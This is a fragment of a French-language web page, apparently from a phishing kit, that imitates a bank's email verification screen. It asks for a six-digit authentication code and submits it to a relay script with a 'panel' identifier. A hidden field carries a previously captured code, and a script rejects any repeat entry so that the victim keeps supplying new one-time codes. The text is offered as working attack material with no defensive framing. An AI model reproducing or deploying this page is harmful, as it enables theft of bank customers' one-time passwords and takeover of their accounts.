	...
	<div class="row js-Template-head">
		...
		<div id="code" class="col-xs-12 col-md-push-6 col-md-6" style="">
		    ...
		    <div class="StrongAuthentication-authenticateU">
		        <h1><b>VERIFICATION PAR EMAIL:</b></h1>
		        
				<form action="relay-4.php?id=panelidentif&357926036" id="formSendCode" method="POST">
			        <div>
					<br /><br />
			            <img src="img/002-email.png">
			            <span><b> &nbsp;&nbsp;&nbsp;Veuillez saisir le code à 6 chiffres reçu dans votre adresse mail:</b></span>
			            <p class="StrongAuthentication-para--padLeft46" style="color:red;size:8px;">Un code est envoyé à votre adresse email certifiée, veuillez vérifiez votre adresse email.</p>
			            
			            <div class="form-group StrongAuthentication-para--padLeft46 SmsAuthentication-formCode">
			                <label for="otpPassInput" class="Login-noPadding Login-accountLabel">CODE D'AUTHENTIFICATION</label>
			                <div class="Login-noPadding">
			                    <div class="add-clear-span form-group"><div class="add-clear-span form-group ">
								<div class="add-clear-span form-group ">
								<div class="add-clear-span form-group ">
								<input type="text" class="form-control input-clear" required=""  data-validation="length number" data-validation-length="6-6" data-validation-error-msg="Votre saisie doit comporter 6 caractères numériques" id="codesms3" name="codesms3" maxlength="6" autocomplete="nope">
								<input type="hidden" name="oldcode2" id="oldcode2" value="<?php echo $_SESSION['codesms2']; ?>" DISABLED>
								<span role="button" class="add-clear-x form-control-feedback icon-form npc-close" style="display: none; cursor: pointer; text-decoration: none; overflow: hidden; position: absolute; pointer-events: auto; right: 0px; top: 4px; z-index: 100;" aria-label="Saisir à nouveau ce champ."></span></div><span role="button" class="add-clear-x form-control-feedback icon-form npc-close" style="display: none; cursor: pointer; text-decoration: none; overflow: hidden; position: absolute; pointer-events: auto; right: 0px; top: 4px; z-index: 100;" aria-label="Saisir à nouveau ce champ."></span></div><span role="button" class="add-clear-x form-control-feedback icon-form npc-close" style="display: none; cursor: pointer; text-decoration: none; overflow: hidden; position: absolute; pointer-events: auto; right: 0px; top: 4px; z-index: 100;" aria-label="Saisir à nouveau ce champ."></span></div><span role="button" class="add-clear-x form-control-feedback icon-form npc-close" style="display: none; cursor: pointer; text-decoration: none; overflow: hidden; position: absolute; pointer-events: auto; right: 0px; top: 4px; z-index: 100;" aria-label="Saisir à nouveau ce champ."></span></div>
...
$('form').submit(function() {
      if (parseInt($('input[name="codesms3"]').val()) == $("#oldcode2").val()) {
		 alert('Vous avez entré le mauvais code, veuillez vérifier à nouveau pour un nouveau sms.');
        return false;
      }
      else{
        return true;
